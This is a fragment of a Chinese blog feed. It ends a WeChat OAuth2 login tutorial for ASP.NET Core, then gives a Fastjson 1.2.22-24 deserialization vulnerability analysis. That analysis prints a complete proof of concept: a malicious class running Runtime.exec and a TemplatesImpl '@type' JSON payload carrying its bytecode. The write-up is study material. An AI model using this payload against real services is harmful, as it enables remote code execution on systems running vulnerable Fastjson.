&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;WeixinAuthenticationHelper.cs&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33.5&quot;&gt;&lt;img id=&quot;code_img_closed_ed489e51-6752-458b-b6fd-3fae0cda4d7b&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_ed489e51-6752-458b-b6fd-3fae0cda4d7b&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_ed489e51-6752-458b-b6fd-3fae0cda4d7b&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;62&quot;&gt;
&lt;pre&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Contains static methods that allow to extract user's information from a &lt;/span&gt;&lt;span&gt;&amp;lt;see cref=&quot;JObject&quot;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; instance retrieved from Weixin after a successful authentication process.
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; WeixinAuthenticationHelper
    {
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the user identifier.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetOpenId(JObject user) =&amp;gt; user.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;openid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the nickname associated with the user profile.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetNickname(JObject user) =&amp;gt; user.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;nickname&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the gender associated with the user profile.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetSex(JObject user) =&amp;gt; user.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;sex&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the province associated with the user profile.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetProvince(JObject user) =&amp;gt; user.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;province&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the city associated with the user profile.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetCity(JObject user) =&amp;gt; user.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;city&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the country associated with the user profile.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetCountry(JObject user) =&amp;gt; user.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;country&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the avatar image url associated with the user profile.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetHeadimgUrl(JObject user) =&amp;gt; user.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;headimgurl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the union id associated with the application.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetUnionid(JObject user) =&amp;gt; user.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;unionid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the privilege associated with the user profile.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; GetPrivilege(JObject user)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; value = user.Value&amp;lt;JArray&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;privilege&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (value == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
            }

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;.Join(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, value.ToObject&amp;lt;&lt;span&gt;string&lt;/span&gt;[]&amp;gt;&lt;span&gt;());
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;WeixinAuthenticationOptions.cs&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;&lt;img id=&quot;code_img_closed_c6d858aa-09b8-4d84-810f-a82255f5b8de&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_c6d858aa-09b8-4d84-810f-a82255f5b8de&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_c6d858aa-09b8-4d84-810f-a82255f5b8de&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;63&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt;&lt;span&gt; WeixinAuthenticationOptions()
        {
            ClaimsIssuer &lt;/span&gt;=&lt;span&gt; WeixinAuthenticationDefaults.Issuer;
            CallbackPath &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; PathString(WeixinAuthenticationDefaults.CallbackPath);

            AuthorizationEndpoint &lt;/span&gt;=&lt;span&gt; WeixinAuthenticationDefaults.AuthorizationEndpoint;
            TokenEndpoint &lt;/span&gt;=&lt;span&gt; WeixinAuthenticationDefaults.TokenEndpoint;
            UserInformationEndpoint &lt;/span&gt;=&lt;span&gt; WeixinAuthenticationDefaults.UserInformationEndpoint;

            Scope.Add(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;snsapi_login&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            Scope.Add(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;snsapi_userinfo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;ClaimActions.MapJsonKey(ClaimTypes.NameIdentifier, &quot;openid&quot;);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;ClaimActions.MapJsonKey(ClaimTypes.Name, &quot;nickname&quot;);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;ClaimActions.MapJsonKey(&quot;urn:qq:figure&quot;, &quot;figureurl_qq_1&quot;);&lt;/span&gt;
        }
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;

&lt;h3&gt;3.怎么用？&lt;/h3&gt;
&lt;p&gt;首先定义我们的接口，接口中当然依旧是用到了 SignInManager，，如果不清楚的，依旧建议去看上一篇。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt;     OAuth2登录
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;provider&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;第三方登录提供器&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;returnUrl&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;回调地址&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
&lt;span&gt;        [HttpGet]
        [Description(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;OAuth2登录&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        [AllowAnonymous]
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;[ValidateAntiForgeryToken]&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt;&lt;span&gt; IActionResult OAuth2()
        {
            &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; provider = HttpContext.Request.Params(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;provider&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; returnUrl = HttpContext.Request.Params(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;returnUrl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; redirectUrl = Url.Action(nameof(OAuth2Callback), &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Identity&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt; { returnUrl = returnUrl ?? &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; });
            AuthenticationProperties properties &lt;/span&gt;=&lt;span&gt; _signInManager.ConfigureExternalAuthenticationProperties(provider, redirectUrl);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Challenge(properties, provider);
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里参数没啥好说的，一个就是 provider:这个东西其实是我们配置的（下面会说），returnUrl，就是你登陆前访问的页面，登陆后还要回过去。 这里还用到i一个回调接口哦，就是 OAuth2Callback，所以至少是需要两个。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt;     OAuth2登录回调
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;returnUrl&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;回调地址&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;remoteError&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;第三方登录错误提示&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
&lt;span&gt;        [HttpGet]
        [Description(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;OAuth2登录回调&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        [AllowAnonymous]
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;[ValidateAntiForgeryToken]&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; IActionResult OAuth2Callback(&lt;span&gt;string&lt;/span&gt; returnUrl = &lt;span&gt;null&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt; remoteError = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (remoteError != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                _logger.LogError($&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;第三方登录错误：{remoteError}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Unauthorized();
            }
             ExternalLoginInfo info &lt;/span&gt;= &lt;span&gt;await&lt;/span&gt;&lt;span&gt; _signInManager.GetExternalLoginInfoAsync();
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (info == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Unauthorized();

             &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; result = &lt;span&gt;await&lt;/span&gt; _signInManager.ExternalLoginSignInAsync(info.LoginProvider, info.ProviderKey, &lt;span&gt;false&lt;/span&gt;, &lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
            _logger.LogWarning($&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SignInResult:{result.ToJsonString()}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            
              &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (result.Succeeded)
            {
                _logger.LogInformation($&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;用户“{info.Principal.Identity.Name}”通过 {info.ProviderDisplayName} OAuth2登录成功&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Ok();
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Unauthorized();
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;代码这就完了哦，剩下的就是调试了，使用1中说到的js（ajax），以及结合上一篇的配置，模拟请求去吧，如果你发现返回提示如下错误，那么就等同事成功了，因为可以在header中看到请求的地址，该地址就是微信的二维码的界面，复制出来在浏览器打开就可：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/557390/201811/557390-20181119230046314-2129541595.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;但是，这里来了个但是，你觉得这样就完了是吧？其实没有，这里有个细节要注意，也就是上面说的 接口的参数：provider,这个东西不是随便写的，可以在请求之前获取一次看看，有哪些provider,如果我们配置了微信那么就是 Weixin,配置了QQ就是QQ，&lt;/p&gt;
&lt;p&gt;查看方式就是一行代码：&lt;/p&gt;
&lt;p&gt;var loginProviders = (await _signInManager.GetExternalAuthenticationSchemesAsync()).ToList();&lt;/p&gt;
&lt;p&gt;这里要注意，否则你的道德返回结果永远都是 未授权，当然这也是可配置的，也就是我们的 WeixinAuthenticationDefaults.cs类中的 的 Scheme,配置啥，传递参数就写啥。&lt;/p&gt;

&lt;h3&gt;4.总结（注意点）&lt;/h3&gt;
&lt;p&gt;1.微信、QQ配置，及开发测试的模拟配置（域名）&lt;/p&gt;
&lt;p&gt;2.跨域问题&lt;/p&gt;
&lt;p&gt;3.参数：provider要一致，不确定的可以通过 _signInManager.GetExternalAuthenticationSchemesAsync() 获取看一下，或者单独讲这个接口提供给前端调用查看。&lt;/p&gt;

</description>
<pubDate>Mon, 19 Nov 2018 15:15:00 +0000</pubDate>
<dc:creator>eSoftor</dc:creator>
<og:description>上一篇是关于模拟请求配置，包括域名问题的解决，本篇就说下授权登录。嗯，比较闲。以前的fx 开发web的时候好像使用的 微信提供的js插件生成二维码，然后扫码登录，，，记不清了，好久不开发微信了。 1.</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Tmc-Blog/p/9986482.html</dc:identifier>
</item>
<item>
<title>Fastjson 1.2.22-24 反序列化漏洞分析 - ka1n4t</title>
<link>http://www.cnblogs.com/litlife/p/9986427.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/litlife/p/9986427.html</guid>
<description>&lt;p&gt;最近在学习Java安全，感觉反序列化很牛皮，所以就来学习一哈。我Java水平不咋地，文章如果有错请指正。&lt;/p&gt;
&lt;p&gt;开始&lt;/p&gt;
&lt;h2 id=&quot;x00-简单介绍&quot;&gt;0x00 简单介绍&lt;/h2&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;介绍：FastJson是一款由阿里开发的JSON库&lt;br/&gt;影响版本：1.2.22-24&lt;br/&gt;官方通告：https://github.com/alibaba/fastjson/wiki/security_update_20170315&lt;br/&gt;补丁：https://github.com/alibaba/fastjson/commit/d075721cf396d5cb70e24c824b901e3a9a5b342b&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;fastjson的简单使用&quot;&gt;FastJson的简单使用&lt;/h3&gt;
&lt;p&gt;先通过一个简单的demo来熟悉一下FastJson的基本操作。首先创建一个Student类，Student.java：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package ka1n4t.test;

public class Student {
    public String name;
    private int age;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Students有一个公有属性name和一个私有属性age。下面使用一个测试类，将json字符串反序列化成Student对象，learnFJ.java：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package ka1n4t.test;


import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.JSONObject;

public class learnFJ {
    public static void main(String args[]) {
        String text = &quot;{\&quot;@type\&quot;:\&quot;ka1n4t.test.Student\&quot;,\&quot;name\&quot;:\&quot;ZhangSan\&quot;,\&quot;age\&quot;:123}&quot;;
        Student obj1 = JSON.parseObject(text, Student.class, Feature.SupportNonPublicField);
        System.out.println(obj1.getName());
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结果：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231158872-1181740505.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;x01-原理分析&quot;&gt;0x01 原理分析&lt;/h2&gt;
&lt;h3 id=&quot;分析poc&quot;&gt;分析POC&lt;/h3&gt;
&lt;p&gt;先看一下用于反序列化的恶意类evilClass1.java:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package ka1n4t.poc;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class evilClass1 extends AbstractTranslet/*ka1n4t*/ {


    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }


    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {

    }

    public evilClass1() throws IOException {
        Runtime.getRuntime().exec(&quot;calc&quot;);
    }

    public static void main(String[] args) throws IOException {
        evilClass1 helloworld = new evilClass1();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中的构造方法是用exec弹个计算器。看下poc，vulApp1.java：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package ka1n4t.poc;

import org.apache.commons.io.IOUtils;
import org.apache.commons.codec.binary.Base64;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class vulApp1 {

    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }

        String result = Base64.encodeBase64String(bos.toByteArray());

        return result;
    }

    public static void bad_method() {
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty(&quot;file.separator&quot;);
        String evil_path = &quot;D:\\Java-App\\fastjson-1.2.22\\target\\classes\\ka1n4t\\poc\\evilClass1.class&quot;;
        String evil_code = readClass(evil_path);

        final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;

        String text1 = &quot;{\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +
                &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evil_code+&quot;\&quot;],&quot; +
                &quot;'_name':'a.b',&quot; +
                &quot;'_tfactory':{ },&quot; +
                &quot;\&quot;_outputProperties\&quot;:{ }}\n&quot;;
        System.out.println(text1);
        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
    }

    public static void main(String args[]) {
        bad_method();
    }

}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;核心部分：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;String text1 = &quot;{\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +
                &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evil_code+&quot;\&quot;],&quot; +
                &quot;'_name':'a.b',&quot; +
                &quot;'_tfactory':{ },&quot; +
                &quot;\&quot;_outputProperties\&quot;:{ }}\n&quot;;

Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;_bytecodes是经过base64编码的evilClass1的字节码文件，NASTY_CLASS是TemplatesImpl类。总结一下这个payload，利用JSON.parseObject反序列化TemplatesImpl类，其中_bytecodes属性是经过base64编码的恶意类字节码文件。&lt;/p&gt;
&lt;h3 id=&quot;调试分析&quot;&gt;调试分析&lt;/h3&gt;
&lt;p&gt;下面来分析一下反序列化TemplatesImpl的调用链，首先调用其getOutputProperties()方法：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231343265-1253086974.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后下面经过java的反射机制，然后到达TemplatesImpl类：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231348265-283556941.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;跟进newTransformer()方法，这个方法是用于创建一个Transformer实例。然后到达getTransletInstance()方法：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231351947-239433345.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;getTransletInstance()方法用于创建一个translet实例，返回这个translet给newTransformer()，然后被包裹成Transformer对象。跟进一下这个方法，发现其调用了defineTransletClasses()用来加载_bytecodes中的类，接着又调用了_class[_transletIndex].newInstance()将defineTransletClasses()返回的类进行实例化：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231357850-1838602332.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;先跟进一下defineTransletClasses方法：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231402287-1895212372.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，使用了loader.defineClass()方法用于加载_bytecodes的内容，并将返回的类赋值给_class[i]（这里的i是0）。loader是TemplatesImpl自定义的类，跟进一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231405560-1672267489.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到TransletClassLoader继承了Java类加载器—ClassLoader类，跟进其defineClass方法，发现直接调用了父类ClassLoader中的方法，所以就不再跟进了。&lt;/p&gt;
&lt;p&gt;回到defineTransletClasses方法，其间接调用ClassLoader加载_bytecodes中的内容之后，将加载出来的类赋值给_class[0]，然后结束，回到getTransletInstance方法，再看一下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231411844-852683963.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，455行直接使用了_class[0].newInstance()创建实例，创建的过程中调用了evilClass1构造方法，然后触发了payload：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231419145-2051768397.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;x02-复现过程&quot;&gt;0x02 复现过程&lt;/h2&gt;
